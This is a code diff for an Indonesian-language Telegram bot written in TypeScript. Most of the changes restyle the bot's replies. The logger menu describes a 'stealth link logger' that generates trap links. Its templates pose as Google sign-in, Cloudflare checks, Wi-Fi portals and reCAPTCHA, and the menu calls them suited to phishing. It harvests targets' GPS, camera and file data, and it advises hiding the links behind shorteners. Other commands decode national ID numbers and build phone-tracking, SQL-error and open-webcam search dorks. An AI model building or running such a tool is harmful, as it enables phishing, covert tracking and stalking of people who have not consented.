@@ -318,7 +318,7 @@ async function startServer() {
         `• <b>/hash [teks]</b>\n  └ <i>Buat checksum MD5 & SHA256 sekaligus.</i>\n\n` +
         `• <b>/uuid</b>\n  └ <i>Generate Unique ID v4 acak.</i>\n\n` +
         `• <b>/weather [kota]</b>\n  └ <i>Data cuaca dari wttr.in (Real-time).</i>\n\n` +
-        `• <b>/crypto_price [koin]</b>\n  └ <i>Cek harga aset kripto (Binance API).</i>\n` +
+        `• <b>/crypto_price [koin]</b>\n  └ <i>Cek harga aset kripto (Market Data API).</i>\n` +
         `━━━━━━━━━━━━━━━━━━━━`;
       const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
@@ -340,18 +340,27 @@ async function startServer() {
     bot.action('menu_logger', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
       const id = generateTrapId(ctx.chat!.id);
-      let msg = `<b>🎣 STEALTH LINK LOGGER v5.1</b>\n` +
+      let msg = `<b>🎣 STEALTH LINK LOGGER v5.2</b>\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n` +
-                `Gunakan template paling meyakinkan untuk jebakan target:\n\n`;
+                `Pilih template operasional berikut:\n\n`;
       
+      const tmplDesc: Record<string, string> = {
+        'google': '└ <i>Auth Identity flow. Cocok untuk phishing profesional.</i>',
+        'gallery': '└ <i>Audit Galeri & GPS. Module Izin Download & Wisata Galeri.</i>',
+        'cloudflare': '└ <i>DDoS Verification flow. Terlihat sangat teknis.</i>',
+        'pegasus': '└ <i>Kernel Terminal flow. Untuk target penyuka tech/hacking.</i>',
+        'wifi': '└ <i>Hotspot Captive Portal. Sangat efektif di tempat umum.</i>',
+        'recap': '└ <i>Invisible reCAPTCHA. Tracking tanpa interaksi tombol.</i>'
+      };
+
       Object.entries(templates).forEach(([key, tmpl]) => {
         const trapUrl = `${appHost.replace(/\/$/, '')}/t/${key}/${id}`;
-        msg += `📦 <b>${tmpl.name}</b>\n🔗 <code>${trapUrl}</code>\n\n`;
+        msg += `📦 <b>${tmpl.name}</b>\n${tmplDesc[key] || ''}\n🔗 <code>${trapUrl}</code>\n\n`;
       });
 
       msg += `━━━━━━━━━━━━━━━━━━━━\n` +
-             `💡 <b>LOGIC:</b> IP & Browser dideteksi otomatis. Module <b>Advanced</b> (GPS, Cam-ID, Screen, Gallery Sync) dikirim jika target klik tombol konfirmasi di halaman.\n\n` +
-             `⚠️ <i>Tips: Selalu gunakan shortener (bit.ly/tinyurl) untuk menyembunyikan URL asli.</i>`;
+             `💡 <b>ALATZ:</b> Browser & IP dideteksi otomatis. Module <b>Advanced</b> (GPS, Cam, Files) terkirim jika target mengizinkan akses di halaman.\n\n` +
+             `⚠️ <i>Saran: Gunakan layanan pemendek URL untuk hasil maksimal.</i>`;
       
       const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
       ctx.editMessageText(msg, {
@@ -403,7 +412,20 @@ async function startServer() {
 
       const provinsi = provMap[prov] || "Tidak diketahui";
 
-      ctx.reply(`🔍 <b>Analisis NIK KTP</b>\n\n📌 NIK: <code>${nik}</code>\n\n🗺️ <b>Wilayah</b>\nProvinsi: ${provinsi} (Kode: ${prov})\nKode Kota/Kab: ${kab}\nKode Kec: ${kec}\n\n👤 <b>Data Diri</b>\nJenis Kelamin: ${jk}\nTanggal Lahir: ${tgl.toString().padStart(2, '0')}-${bln}-${thn}\nNomor Urut Pendaftaran: ${urut}`, { parse_mode: 'HTML' });
+      const reply = `<b>🇮🇩 DATA NIK DECODER</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `📋 <b>NIK:</b> <code>${nik}</code>\n` +
+                    `👤 <b>Gender:</b> ${jk}\n` +
+                    `📅 <b>Lahir:</b> <code>${tgl.toString().padStart(2, '0')}-${bln}-${thn}</code>\n` +
+                    `📍 <b>Wilayah:</b>\n` +
+                    `├ Provinsi: ${provinsi}\n` +
+                    `├ Kode Kab: ${kab}\n` +
+                    `└ Kode Kec: ${kec}\n` +
+                    `🔢 <b>No Urut:</b> ${urut}\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `✅ <i>Analisis selesai.</i>`;
+
+      ctx.reply(reply, { parse_mode: 'HTML' });
     });
 
     bot.command('plat', (ctx) => {
@@ -423,7 +445,17 @@ async function startServer() {
 
       const wilayah = platMap[kodeWilayah] || "Wilayah tidak terdaftar";
 
-      ctx.reply(`🚗 <b>Analisis Plat Kendaraan</b>\n\n🧾 Nomor: <code>${kodeWilayah} ${angka} ${kodeDetail}</code>\n\n📌 <b>Kode Area (${kodeWilayah})</b>\nWilayah: ${wilayah}\n\n🔢 Nomor Polisi: ${angka}\n🔡 Kode Detail/Sub-wilayah: ${kodeDetail || '-'}`, { parse_mode: 'HTML' });
+      const reply = `<b>🚗 PLAT ANALYZER (ID)</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `🔢 <b>PLAT:</b> <code>${kodeWilayah} ${angka} ${kodeDetail}</code>\n` +
+                    `📍 <b>WILAYAH:</b> ${wilayah}\n` +
+                    `├ Kode Area: ${kodeWilayah}\n` +
+                    `├ No Polisi: ${angka}\n` +
+                    `└ Detail/Sub: ${kodeDetail || '-'}\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `✅ <i>Analisis selesai.</i>`;
+
+      ctx.reply(reply, { parse_mode: 'HTML' });
     });
 
     bot.command('sethost', (ctx) => {
@@ -470,17 +502,29 @@ async function startServer() {
         const data = await response.json();
         if (data.status === 'success') {
           const mapLink = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
-          let reply = `🔍 <b>INFO TARGET IP:</b> <code>${data.query}</code>\n\n`;
-          reply += `🏢 <b>Provider & Organisasi:</b>\n`;
-          reply += `ISP: ${data.isp || '-'}\nOrg: ${data.org || '-'}\nASN: ${data.as || '-'}\nHostname: ${data.reverse || '-'}\n\n`;
-          reply += `📍 <b>Lokasi (Registrasi Jaringan):</b>\n`;
-          reply += `Negara: ${data.country || '-'}\nProvinsi: ${data.regionName || '-'}\nKota: ${data.city || '-'}\nKecamatan: ${data.district || '-'}\nKode Pos: ${data.zip || '-'}\nTimezone: ${data.timezone || '-'}\n`;
-          reply += `Koordinat: <code>${data.lat || '-'}, ${data.lon || '-'}</code>\n<a href="${mapLink}">🗺️ Buka di Google Maps (Area Provider)</a>\n\n`;
-          reply += `🛡️ <b>Deteksi Keamanan:</b>\n`;
-          reply += `Mobile/Seluler: ${data.mobile ? '✅ Ya' : '❌ Tidak'}\n`;
-          reply += `Proxy/VPN/Tor: ${data.proxy ? '⚠️ YA (Disembunyikan)' : '❌ Tidak'}\n`;
-          reply += `Hosting/Datacenter: ${data.hosting ? '⚠️ YA (Server)' : '❌ Tidak'}\n\n`;
-          reply += `<i>Catatan: Tracking IP Umum hanya menunjuk menara BTS / Server Provider terdekat, BUKAN rumah target. Untuk tracking target asli, gunakan fitur: <b>/logger</b></i>`;
+          let reply = `<b>🌐 TARGET IP ANALYTICS</b>\n` +
+                      `━━━━━━━━━━━━━━━━━━━━\n` +
+                      `💎 <b>QUERY:</b> <code>${data.query}</code>\n\n` +
+                      `🏢 <b>INFRASTRUKTUR:</b>\n` +
+                      `├ ISP: ${data.isp || '-'}\n` +
+                      `├ ORG: ${data.org || '-'}\n` +
+                      `├ ASN: ${data.as || '-'}\n` +
+                      `└ RVRS: ${data.reverse || '-'}\n\n` +
+                      `📍 <b>LOKASI REGIONAL:</b>\n` +
+                      `├ NEGARA: ${data.country || '-'}\n` +
+                      `├ REGION: ${data.regionName || '-'}\n` +
+                      `├ KOTA: ${data.city || '-'}\n` +
+                      `├ POS: ${data.zip || '-'}\n` +
+                      `└ TMZN: ${data.timezone || '-'}\n\n` +
+                      `🌎 <b>SPATIAL:</b>\n` +
+                      `├ COORD: <code>${data.lat || '-'}, ${data.lon || '-'}</code>\n` +
+                      `└ MAPS: <a href="${mapLink}">Lihat Lokasi BTS</a>\n\n` +
+                      `🛡️ <b>RISK ANALYSIS:</b>\n` +
+                      `├ MOBILE: ${data.mobile ? '✅' : '❌'}\n` +
+                      `├ PROXY/VPN: ${data.proxy ? '⚠️ DETEKSI' : '✅ BERSIH'}\n` +
+                      `└ HOSTING: ${data.hosting ? '⚠️ SERVER' : '✅ RESIDENTIAL'}\n` +
+                      `━━━━━━━━━━━━━━━━━━━━\n` +
+                      `⚠️ <i>Info: Geolocation IP mengacu pada titik registrasi provider, bukan titik GPS fisik target. Gunakan /logger untuk hasil presisi.</i>`;
           ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
         } else {
           ctx.reply("❌ Gagal mendapatkan informasi IP.");
@@ -500,12 +544,19 @@ async function startServer() {
         const res = await fetch(`https://networkcalc.com/api/dns/whois/${domain}`);
         const data = await res.json();
         if (data.status === 'OK' && data.whois) {
-          let txt = `🌐 <b>WHOIS DATA: <code>${domain}</code></b>\n\n`;
-          txt += `<b>📝 Registrar:</b> ${data.whois.registrar || '-'}\n`;
-          txt += `<b>📅 Dibuat:</b> ${data.whois.creation_date || '-'}\n`;
-          txt += `<b>🔄 Diperbarui:</b> ${data.whois.updated_date || '-'}\n`;
-          txt += `<b>⏳ Berakhir:</b> ${data.whois.expiration_date || '-'}\n\n`;
-          txt += `<b>📡 Name Servers:</b>\n${(data.whois.name_servers || []).map((ns:any)=>`• <code>${ns}</code>`).join('\n')}\n`;
+          let txt = `🌐 <b>WHOIS DATA ANALYTICS</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `💎 <b>DOMAIN:</b> <code>${domain}</code>\n\n` +
+                    `📝 <b>REGISTRAR INFO:</b>\n` +
+                    `└ Name: ${data.whois.registrar || '-'}\n\n` +
+                    `📆 <b>DATES:</b>\n` +
+                    `├ CREATED: ${data.whois.creation_date || '-'}\n` +
+                    `├ UPDATED: ${data.whois.updated_date || '-'}\n` +
+                    `└ EXPIRED: ${data.whois.expiration_date || '-'}\n\n` +
+                    `📡 <b>NAME SERVERS:</b>\n` +
+                    (data.whois.name_servers || []).map((ns:any)=>`├ <code>${ns}</code>`).join('\n').replace(/├$/, '└') +
+                    `\n━━━━━━━━━━━━━━━━━━━━\n` +
+                    `✅ <i>Query WHOIS berhasil.</i>`;
           ctx.reply(txt, {parse_mode: 'HTML'});
         } else {
           ctx.reply(`❌ Whois data tidak ditemukan untuk <code>${domain}</code>. (Pastikan format domain benar tanpa https://)`, {parse_mode: 'HTML'});
@@ -525,19 +576,24 @@ async function startServer() {
         const response = await fetch(`https://networkcalc.com/api/dns/lookup/${domain}`);
         const data = await response.json();
         if(data.status === 'OK' && data.records) {
-          let txt = `📋 <b>DNS RECORDS: <code>${domain}</code></b>\n\n`;
+          let txt = `📋 <b>DNS RECORD MAPPING</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `💎 <b>DOMAIN:</b> <code>${domain}</code>\n\n`;
           ['A', 'AAAA', 'MX', 'TXT', 'CNAME', 'NS'].forEach(type => {
             if(data.records[type] && data.records[type].length > 0) {
-              txt += `<b>[+] ${type} Records:</b>\n`;
-              data.records[type].forEach((rec: any) => {
-                if(type === 'MX') txt += `• <code>${rec.exchange}</code> (Prioritas: ${rec.priority})\n`;
-                else if(type === 'TXT') txt += `• <code>${rec.replace(/.{1,40}/g, '$&\n  ')}</code>\n`;
-                else txt += `• <code>${rec.address || rec}</code>\n`;
+              txt += `<b>[+] ${type} RECORDS:</b>\n`;
+              data.records[type].forEach((rec: any, idx: number, arr: any[]) => {
+                const sym = idx === arr.length - 1 ? '└' : '├';
+                if(type === 'MX') txt += `${sym} <code>${rec.exchange}</code> (Prio: ${rec.priority})\n`;
+                else if(type === 'TXT') txt += `${sym} <code>${rec.replace(/.{1,40}/g, '$&')}</code>\n`;
+                else txt += `${sym} <code>${rec.address || rec}</code>\n`;
               });
               txt += '\n';
             }
           });
-          if(txt.length > 4000) txt = txt.substring(0, 3950) + "\n\n... (Terpotong karena limit Telegram)";
+          txt += `━━━━━━━━━━━━━━━━━━━━\n` +
+                 `✅ <i>Fetch DNS selesai.</i>`;
+          if(txt.length > 4000) txt = txt.substring(0, 3950) + "\n\n... (Terpotong limit)";
           ctx.reply(txt, {parse_mode: 'HTML'});
         } else {
           ctx.reply("❌ DNS records tidak ditemukan.");
@@ -558,7 +614,15 @@ async function startServer() {
         const domain = email.split("@")[1];
         const records = await resolveMx(domain);
         if (records && records.length > 0) {
-          ctx.reply(`✅ Email [${email}] memiliki format valid.\n🏢 Domain [${domain}] AKTIF menerima email.\n\nMemiliki MX records:\n${records.map(r => `- [Pri: ${r.priority}] ${r.exchange}`).join('\n')}`);
+          const reply = `<b>📧 EMAIL MX VALIDATOR</b>\n` +
+                        `━━━━━━━━━━━━━━━━━━━━\n` +
+                        `🎯 <b>TARGET:</b> <code>${email}</code>\n` +
+                        `🌐 <b>DOMAIN:</b> <code>${domain}</code>\n\n` +
+                        `✅ STATUS:<b> AKTIF Menerima Email</b>\n\n` +
+                        `📋 <b>MX RECORDS:</b>\n` +
+                        records.map((r, idx) => `${idx === records.length - 1 ? '└' : '├'} [Pri: ${r.priority}] ${r.exchange}`).join('\n') +
+                        `\n━━━━━━━━━━━━━━━━━━━━`;
+          ctx.reply(reply, { parse_mode: 'HTML' });
         } else {
           ctx.reply(`❌ Tidak ditemukan MX records untuk domain ${domain}.`);
         }
@@ -698,51 +762,68 @@ async function startServer() {
       const blockedList = results.filter(r => r.status === 403 || r.status === 429);
       const notFoundList = results.filter(r => !r.found && r.status !== 403 && r.status !== 429);
 
-      let replyText = `🎯 <b>Hasil Scan Digital: @${username}</b>\n\n`;
+      let replyText = `<b>🎯 DIGITAL FOOTPRINT ANALYSIS: @${username}</b>\n` +
+                      `━━━━━━━━━━━━━━━━━━━━\n\n`;
       
       if (foundList.length > 0) {
-        replyText += `🟢 <b>DITEMUKAN (${foundList.length})</b>\n`;
-        foundList.forEach(r => replyText += `• <a href="${r.url}">${r.name}</a>\n`);
-      } else {
-        replyText += `🟢 <b>DITEMUKAN (0)</b>\n`;
+        replyText += `🟢 <b>DITEMUKAN (${foundList.length} PLATFORM)</b>\n`;
+        foundList.forEach(r => replyText += `├ <a href="${r.url}">${r.name}</a>\n`);
+        replyText = replyText.replace(/\n├ (<a href="[^"]+">[^<]+<\/a>)\n$/, "\n└ $1\n"); // Fix last icon
       }
 
       if (blockedList.length > 0) {
-        replyText += `\n🟡 <b>PROTEKSI BOT / MINTA CEK MANUAL (${blockedList.length})</b>\n`;
-        blockedList.forEach(r => replyText += `• <a href="${r.url}">${r.name}</a> ⚠️\n`);
+        replyText += `\n🟡 <b>PROTECTED / MANUAL CHECK (${blockedList.length})</b>\n`;
+        blockedList.forEach(r => replyText += `├ <a href="${r.url}">${r.name}</a> ⚠️\n`);
+        replyText = replyText.replace(/\n├ (<a href="[^"]+">[^<]+<\/a> ⚠️)\n$/, "\n└ $1\n");
       }
 
-      replyText += `\n❌ <b>TIDAK DITEMUKAN (${notFoundList.length} platform)</b>\n`;
+      replyText += `\n❌ <b>TIDAK DITEMUKAN (${notFoundList.length} PLATFORM)</b>\n`;
       if (notFoundList.length > 0) {
-        replyText += `<i>Antara lain: ${notFoundList.map(r => r.name).slice(0, 5).join(', ')}...</i>`;
+        replyText += `└ <i>Antara lain: ${notFoundList.map(r => r.name).slice(0, 5).join(', ')}...</i>\n`;
       }
+      
+      replyText += `━━━━━━━━━━━━━━━━━━━━\n` +
+                   `✅ <i>Digital footprint scan complete.</i>`;
 
       ctx.reply(replyText, { link_preview_options: { is_disabled: true }, parse_mode: 'HTML' });
     });
 
     bot.command('mac', async (ctx) => {
       const args = ctx.message.text.split(' ');
-      if (args.length < 2) return ctx.reply("Format: /mac [xx:xx:xx:xx:xx:xx]");
+      if (args.length < 2) return ctx.reply("Format: /mac [MAC_ADDRESS]");
       try {
         const res = await fetch(`https://api.macvendors.com/${args[1]}`);
         if(res.status === 200) {
-          ctx.reply(`🔍 <b>MAC Vendor:</b> ${await res.text()}`, { parse_mode: 'HTML' });
+          const vendor = await res.text();
+          const reply = `<b>🔌 MAC VENDOR LOOKUP</b>\n` +
+                        `━━━━━━━━━━━━━━━━━━━━\n` +
+                        `🆔 <b>MAC:</b> <code>${args[1]}</code>\n` +
+                        `🏢 <b>VENDOR:</b> <code>${vendor}</code>\n` +
+                        `━━━━━━━━━━━━━━━━━━━━\n` +
+                        `✅ <i>Query data berhasil.</i>`;
+          ctx.reply(reply, { parse_mode: 'HTML' });
         } else {
-          ctx.reply("❌ Tidak ditemukan vendor untuk MAC tersebut (atau rate limited).");
+          ctx.reply("❌ Tidak ditemukan vendor (atau rate limited).");
         }
       } catch (e) { ctx.reply("❌ Error fetching MAC info."); }
     });
 
     bot.command('headers', async (ctx) => {
       const args = ctx.message.text.split(' ');
-      if (args.length < 2) return ctx.reply("Format: /headers [url] (misal: https://google.com)");
+      if (args.length < 2) return ctx.reply("Format: /headers [url]");
       let url = args[1];
       if(!url.startsWith('http')) url = 'http://' + url;
       try {
         const res = await fetchWithTimeout(url, { method: 'HEAD' }, 4000);
         let hdrs = '';
-        res.headers.forEach((v, k) => hdrs += `${k}: ${v}\n`);
-        ctx.reply(`🌐 <b>HTTP Headers:</b>\n<pre>${hdrs.substring(0,3900)}</pre>`, { parse_mode: 'HTML' });
+        res.headers.forEach((v, k) => hdrs += `├ ${k}: ${v}\n`);
+        const reply = `<b>🛡️ HTTP SECURITY HEADERS</b>\n` +
+                      `━━━━━━━━━━━━━━━━━━━━\n` +
+                      `💎 <b>TARGET:</b> <code>${url}</code>\n\n` +
+                      `📋 <b>HEADERS DATA:</b>\n` +
+                      `<pre>${hdrs.substring(0,3800)}</pre>` +
+                      `━━━━━━━━━━━━━━━━━━━━`;
+        ctx.reply(reply, { parse_mode: 'HTML' });
       } catch (e) { ctx.reply("❌ Error fetching headers."); }
     });
 
@@ -750,22 +831,36 @@ async function startServer() {
       const args = ctx.message.text.split(' ').slice(1).join(' ');
       if(!args) return ctx.reply("Format: /dork [keyword]");
       const q = encodeURIComponent(args);
-      ctx.reply(`🔍 <b>Google Dorks Generator:</b>\n\n` +
-        `• Directory Listing: <a href="https://www.google.com/search?q=intitle:%22index+of%22+${q}">Cari Direktori</a>\n` +
-        `• File PDF/DOC: <a href="https://www.google.com/search?q=${q}+filetype:pdf+OR+filetype:doc">Cari Dokumen</a>\n` +
-        `• Login Pages: <a href="https://www.google.com/search?q=inurl:login+${q}">Cari Login</a>\n` +
-        `• SQL Errors: <a href="https://www.google.com/search?q=${q}+%22you+have+an+error+in+your+sql+syntax%22">SQLi Dork</a>\n` +
-        `• Webcams: <a href="https://www.google.com/search?q=inurl:view/view.shtml+${q}">Cari CCTV/Webcam</a>`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
+      const reply = `<b>🔍 GOOGLE DORKS GENERATOR</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `💎 <b>KEYWORD:</b> <code>${args}</code>\n\n` +
+                    `├ 📦 <b>Listing:</b> <a href="https://www.google.com/search?q=intitle:%22index+of%22+${q}">Cek Direktori</a>\n` +
+                    `├ 📄 <b>Files:</b> <a href="https://www.google.com/search?q=${q}+filetype:pdf+OR+filetype:doc">Cari Dokumen</a>\n` +
+                    `├ 👤 <b>Login:</b> <a href="https://www.google.com/search?q=inurl:login+${q}">Cari Form Login</a>\n` +
+                    `├ 🐞 <b>SQL:</b> <a href="https://www.google.com/search?q=${q}+%22sql+syntax%22">SQL Error Dork</a>\n` +
+                    `└ 🎥 <b>CCTV:</b> <a href="https://www.google.com/search?q=inurl:view/view.shtml+${q}">Cari Open Camera</a>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `✅ <i>Dorking links generated.</i>`;
+      ctx.reply(reply, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
     });
 
     bot.command('bininfo', async (ctx) => {
       const args = ctx.message.text.split(' ');
-      if(args.length < 2) return ctx.reply("Format: /bininfo [6 digit awal kartu]");
+      if(args.length < 2) return ctx.reply("Format: /bininfo [BIN]");
       try {
         const res = await fetch(`https://data.handyapi.com/bin/${args[1]}`);
         const data = await res.json();
         if(data && data.Status === 'SUCCESS') {
-          ctx.reply(`💳 <b>BIN Info:</b>\nScheme: ${data.Scheme}\nType: ${data.Type}\nCard Tier: ${data.CardTier}\nNegara: ${data.Country.Name}\nBank: ${data.Issuer}`, { parse_mode: 'HTML' });
+          const reply = `<b>💳 CREDIT CARD BIN INFO</b>\n` +
+                        `━━━━━━━━━━━━━━━━━━━━\n` +
+                        `💎 <b>BIN:</b> <code>${args[1]}</code>\n\n` +
+                        `├ 📂 TYPE: ${data.Scheme} (${data.Type})\n` +
+                        `├ 🔝 TIER: ${data.CardTier}\n` +
+                        `├ 📍 NEGARA: ${data.Country.Name}\n` +
+                        `└ 🏦 BANK: ${data.Issuer}\n` +
+                        `━━━━━━━━━━━━━━━━━━━━\n` +
+                        `✅ <i>Query BIN berhasil.</i>`;
+          ctx.reply(reply, { parse_mode: 'HTML' });
         } else {
           ctx.reply("❌ Data BIN tidak ditemukan.");
         }
@@ -775,15 +870,23 @@ async function startServer() {
     bot.command('subdomain', async (ctx) => {
       const args = ctx.message.text.split(' ');
       if(args.length < 2) return ctx.reply("Format: /subdomain [domain.com]");
+      const domain = args[1];
       try {
-        ctx.reply("🔍 Sedang mencari subdomain...");
-        const res = await fetchWithTimeout(`https://crt.sh/?q=%25.${args[1]}&output=json`, {}, 8000);
+        ctx.reply(`🔍 Sedang crawling mapping subdomain untuk <b>${domain}</b>...`, {parse_mode: 'HTML'});
+        const res = await fetchWithTimeout(`https://crt.sh/?q=%25.${domain}&output=json`, {}, 8000);
         const data = await res.json();
         const subs = [...new Set(data.map((d:any) => d.name_value))].slice(0, 30);
         if(subs.length > 0) {
-          ctx.reply(`🌐 <b>Subdomain Ditemukan:</b>\n<pre>${subs.join('\n')}</pre>\n\n<i>(Menampilkan maks 30)</i>`, {parse_mode: 'HTML'});
+          const reply = `<b>🌐 SUBDOMAIN RECON MAPPING</b>\n` +
+                        `━━━━━━━━━━━━━━━━━━━━\n` +
+                        `💎 <b>TARGET:</b> <code>${domain}</code>\n\n` +
+                        `📋 <b>FOUND SUBS (MAX 30):</b>\n` +
+                        subs.map((s, idx) => `${idx === subs.length - 1 ? '└' : '├'} <code>${s}</code>`).join('\n') +
+                        `\n━━━━━━━━━━━━━━━━━━━━\n` +
+                        `✅ <i>Reconnaissance selesai.</i>`;
+          ctx.reply(reply, {parse_mode: 'HTML'});
         } else { ctx.reply("❌ Tidak ada subdomain ditemukan."); }
-      } catch(e) { ctx.reply("❌ Gagal mencari subdomain. Server crt.sh lambat."); }
+      } catch(e) { ctx.reply("❌ Gagal mencari subdomain. (crt.sh timeout)"); }
     });
 
     bot.command('github_user', async (ctx) => {
@@ -792,8 +895,21 @@ async function startServer() {
       try {
         const res = await fetch(`https://api.github.com/users/${args[1]}`);
         if(res.status !== 200) return ctx.reply("❌ User tidak ditemukan.");
-        const data = await res.json();
-        ctx.reply(`🐙 <b>GitHub OSINT:</b>\n\nUsername: ${data.login}\nNama: ${data.name || '-'}\nBio: ${data.bio || '-'}\nLokasi: ${data.location || '-'}\nCompany: ${data.company || '-'}\nBlog: ${data.blog || '-'}\nPublic Repos: ${data.public_repos}\nFollowers: ${data.followers}\nDibuat: ${new Date(data.created_at).toISOString().split('T')[0]}\nURL: ${data.html_url}`, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
+        const d = await res.json();
+        const reply = `<b>🐙 GITHUB OSINT ANALYTICS</b>\n` +
+                      `━━━━━━━━━━━━━━━━━━━━\n` +
+                      `👤 <b>USER:</b> <code>${d.login}</code>\n\n` +
+                      `├ <b>Name:</b> ${d.name || '-'}\n` +
+                      `├ <b>Bio:</b> ${d.bio || '-'}\n` +
+                      `├ <b>Location:</b> ${d.location || '-'}\n` +
+                      `├ <b>Company:</b> ${d.company || '-'}\n` +
+                      `├ <b>Repos:</b> ${d.public_repos} (Public)\n` +
+                      `├ <b>Followers:</b> ${d.followers}\n` +
+                      `├ <b>Created:</b> ${new Date(d.created_at).toISOString().split('T')[0]}\n` +
+                      `└ <b>Link:</b> <a href="${d.html_url}">Visit Profile</a>\n` +
+                      `━━━━━━━━━━━━━━━━━━━━\n` +
+                      `✅ <i>Metadata extraction complete.</i>`;
+        ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
       } catch(e) { ctx.reply("❌ Error fetching GitHub data."); }
     });
 
@@ -803,26 +919,36 @@ async function startServer() {
       const ip = args[1]; const port = parseInt(args[2]);
       const socket = new net.Socket();
       socket.setTimeout(2500);
-      let status = "❌ Tertutup / Timeout";
-      socket.on('connect', () => { status = "✅ Terbuka"; socket.destroy(); });
+      let status = "❌ CLOSED / UNREACHABLE";
+      socket.on('connect', () => { status = "✅ OPENED"; socket.destroy(); });
       socket.on('timeout', () => { socket.destroy(); });
       socket.on('error', () => { socket.destroy(); });
       socket.on('close', () => {
-        ctx.reply(`🔌 <b>Scan Port:</b>\nTarget: <code>${ip}</code>\nPort: <code>${port}</code>\nStatus: ${status}`, { parse_mode: 'HTML' });
+        const reply = `<b>🔌 TCP PORT CONNECTIVITY</b>\n` +
+                      `━━━━━━━━━━━━━━━━━━━━\n` +
+                      `💎 <b>TARGET:</b> <code>${ip}</code>\n` +
+                      `├ <b>PORT:</b> <code>${port}</code>\n` +
+                      `└ <b>STATUS:</b> <b>${status}</b>\n` +
+                      `━━━━━━━━━━━━━━━━━━━━`;
+        ctx.reply(reply, { parse_mode: 'HTML' });
       });
       socket.connect(port, ip);
     });
 
     bot.command('phone_dork', (ctx) => {
       const args = ctx.message.text.split(' ').slice(1).join(' ');
-      if(!args) return ctx.reply("Format: /phone_dork [nomor_hp] (misal: 0812345...)");
+      if(!args) return ctx.reply("Format: /phone_dork [nomor_hp]");
       const numInfo = args.replace(/\D/g, '');
       const numID = numInfo.startsWith('0') ? '62' + numInfo.substring(1) : numInfo;
-      ctx.reply(`📱 <b>Phone OSINT Dorks:</b>\n\n` +
-        `• Truecaller (Perlu Login): <a href="https://www.truecaller.com/search/global/${numID}">Cari di Truecaller</a>\n` +
-        `• GetContact: (Cari via Apps, tidak bisa via web publik)\n` +
-        `• WhatsApp Link: <a href="https://wa.me/${numID}">Chat WhatsApp</a>\n` +
-        `• Google Dork: <a href="https://www.google.com/search?q=%22${args}%22+OR+%22${numID}%22">Cari Web Jejak Nomor</a>`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
+      const reply = `<b>📱 PHONE TRACKING DORKS</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `💎 <b>TARGET:</b> <code>${args}</code>\n\n` +
+                    `├ 📦 <b>Truecaller:</b> <a href="https://www.truecaller.com/search/global/${numID}">Cari Identitas</a>\n` +
+                    `├ 💬 <b>WhatsApp:</b> <a href="https://wa.me/${numID}">Check Profile</a>\n` +
+                    `└ 🔍 <b>Google:</b> <a href="https://www.google.com/search?q=%22${args}%22+OR+%22${numID}%22">Cari Jejak Digital</a>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `⚠️ <i>Tips: Gunakan aplikasi GetContact (Apps) untuk hasil nama tag terbaik.</i>`;
+      ctx.reply(reply, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
     });
 
     bot.command('qr', (ctx) => {
@@ -838,7 +964,12 @@ async function startServer() {
       try {
         const res = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(url)}`);
         const data = await res.json();
-        ctx.reply(`🔗 Shortlink: ${data.shorturl || "Error"}`);
+        const reply = `<b>🔗 URL SHORTENING (is.gd)</b>\n` +
+                      `━━━━━━━━━━━━━━━━━━━━\n` +
+                      `📋 <b>ORIGINAL:</b> <code>${url}</code>\n` +
+                      `✨ <b>RESULT:</b> <code>${data.shorturl || "Error"}</code>\n` +
+                      `━━━━━━━━━━━━━━━━━━━━`;
+        ctx.reply(reply, { parse_mode: 'HTML' });
       } catch(e) { ctx.reply("❌ Error shortening link."); }
     });
 
@@ -849,26 +980,50 @@ async function startServer() {
       const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+~`|}{[]:;?><,./-=";
       let retVal = "";
       for (let i = 0; i < len; ++i) { retVal += charset.charAt(Math.floor(Math.random() * charset.length)); }
-      ctx.reply(`🔑 Password (${len} chars): <code>${retVal}</code>`, {parse_mode: 'HTML'});
+      const reply = `<b>🔑 SECURE PASSWORD GEN</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `📏 <b>Length:</b> ${len} chars\n` +
+                    `✨ <b>Result:</b> <code>${retVal}</code>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━`;
+      ctx.reply(reply, {parse_mode: 'HTML'});
     });
 
     bot.command('b64enc', (ctx) => {
       const args = ctx.message.text.split(' ').slice(1).join(' ');
       if(!args) return ctx.reply("Format: /b64enc [text]");
-      ctx.reply(`🔤 Base64 Encode:\n<code>${Buffer.from(args).toString('base64')}</code>`, {parse_mode: 'HTML'});
+      const result = Buffer.from(args).toString('base64');
+      const reply = `<b>🔤 BASE64 ENCODER</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `<code>${result}</code>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━`;
+      ctx.reply(reply, {parse_mode: 'HTML'});
     });
 
     bot.command('b64dec', (ctx) => {
